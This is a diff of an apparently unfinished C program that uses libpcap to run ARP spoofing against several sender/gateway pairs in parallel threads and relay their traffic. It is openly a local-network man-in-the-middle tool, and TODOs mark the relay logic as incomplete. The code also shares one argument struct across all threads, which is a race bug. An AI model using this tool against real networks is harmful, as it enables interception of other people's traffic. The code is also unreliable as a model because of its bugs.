@@ -1,5 +1,8 @@
 #include "stdafx.h"
 
+u_char myMac[6];
+char* interface;
+
 int getMyMac(u_char* myMac, char* _interface){
     struct ifreq s;
     int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
@@ -38,33 +41,17 @@ int isReq(const uint8_t* pck){
     return 0;
 }
 
-int main(int argc, char *argv[]) {
-    if (argc != 4) {
-        printf("--Wrong arguments---\n %s <interface> <sender_IP> <gateway_IP>\n", argv[0]);
-        return -5;
-    }
-    // packet에서 srcMAC를 gateway(target_ip의 MAC)로
-    // dstMAC을 sender_ip의 MAC으로
+void* spoof(void *thr_ptr){
+
+    thread_args* argv = (thread_args*) thr_ptr;
 
     u_char sender_ip[4];
     u_char gateway_ip[4];
 
-    // sender_ip와 gateway_ip에 argv값을 전달
-    {
-        char* temp;
-        temp = strtok(argv[2], ".");
-        sender_ip[0] = atoi(temp);
-        for(int i= 1; i<IP_SIZE; i++){
-            sender_ip[i] = atoi(strtok(NULL, "."));
-        }
+    memcpy(sender_ip, argv->sender_ip, IP_SIZE);
+    memcpy(gateway_ip, argv->gateway_ip, IP_SIZE);
 
-        temp = strtok(argv[3], ".");
-        gateway_ip[0] = atoi(temp);
-        for(int i= 1; i<IP_SIZE; i++){
-            gateway_ip[i] = atoi(strtok(NULL, "."));
-        }
-
-    }
+    //TODO sender ~~ 이 둘에다가 구조체 값 넣어줘야함
 
     for(int i = 0; i<IP_SIZE; i++){
         printf("%d.", sender_ip[i]);
@@ -77,10 +64,6 @@ int main(int argc, char *argv[]) {
 
     const u_char* ucp_DATA;
     pcap_t *stp_NIC;
-
-    u_char myMac[6];
-    getMyMac(myMac, argv[1]);
-    char* interface = argv[1];
     // char* interface = argv[1];
     //char* sender_ip = argv[2];
     //char gateway_ip[] = {192,168,43,1};
@@ -90,12 +73,14 @@ int main(int argc, char *argv[]) {
     pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
     if (handle == NULL) {
         fprintf(stderr, "couldn't open device %s: %s\n", interface, errbuf);
-        return -1;
+        exit(-1);
     }
 
     struct pcap_pkthdr* header;
     const uint8_t* packet;
     u_char SenderMAC[6];
+    printf("!!!\n");
+
     u_char DstMAC[6];
     u_char GateWayMac[6];
 
@@ -148,7 +133,7 @@ int main(int argc, char *argv[]) {
         //TODO sender가
     }
 
-    printf("Relay 패킷\n");
+    printf("Relay packet\n");
     //TODO relay packet 작성
     while(true){
         if(pcap_next_ex(handle, &header, &packet)==0){
@@ -171,4 +156,64 @@ int main(int argc, char *argv[]) {
         //TODO 게이트웨이에서 보낸거 다시 받고 수정 거쳐서 sender에게 보낸다.
         // 코드작성후 인터넷이 되는지로 확인
     }
+}
+
+int main(int argc, char *argv[]) {
+    int NUM_THREADS = (argc-2)/2;
+    int rc;
+    u_char sender_ip[4];
+    u_char gateway_ip[4];
+    thread_args THREAD_ARG;
+
+    interface = argv[1];
+    if (argc < 4) {
+        printf("--Wrong arguments---\n %s <interface> <sender_IP> <gateway_IP> ~~~~~\n", argv[0]);
+        return -5;
+    }
+
+    // sender_ip와 gateway_ip에 argv값을 전달
+    // packet에서 srcMAC를 gateway(target_ip의 MAC)로
+    // dstMAC을 sender_ip의 MAC으로
+    pthread_t threads[NUM_THREADS];
+
+    getMyMac(myMac, argv[1]);
+
+    printf("----\n");
+    printf("NUM_THREADS : %d\n",NUM_THREADS);
+    for(int i =1; i<=NUM_THREADS; i++){
+        // 23 45 67 89
+        printf("-----%d\n", i);
+        char *temp;
+        temp = strtok(argv[i*2], ".");
+        sender_ip[0] = atoi(temp);
+        for (int i = 1; i < IP_SIZE; i++) {
+            printf("===========\n");
+            sender_ip[i] = atoi(strtok(NULL, "."));
+        }
+
+        temp = strtok(argv[i*2+1], ".");
+        gateway_ip[0] = atoi(temp);
+        for (int i = 1; i < IP_SIZE; i++) {
+            gateway_ip[i] = atoi(strtok(NULL, "."));
+        }
+        printf("\n");
+
+        memcpy(THREAD_ARG.sender_ip, sender_ip, IP_SIZE);
+        memcpy(THREAD_ARG.gateway_ip, gateway_ip, IP_SIZE);
+
+        rc = pthread_create(&threads[i-1], NULL, spoof, (void*)&THREAD_ARG);
+
+        for(int i =0; i<IP_SIZE; i++){
+            printf("%d.",sender_ip[i]);
+        }
+        printf("\n");
+        // 인덱스가 1부터 시작하므로 i-1로 넣음
+        if(rc){
+            printf("Error: unable to create thread\n");
+        }
+    }
+
+    for(int i = 0; i<NUM_THREADS; i++)
+        pthread_join(threads[i], NULL);
+        //스레드 종료전까지 대기.(프로그램 종료를 방지함)
 }
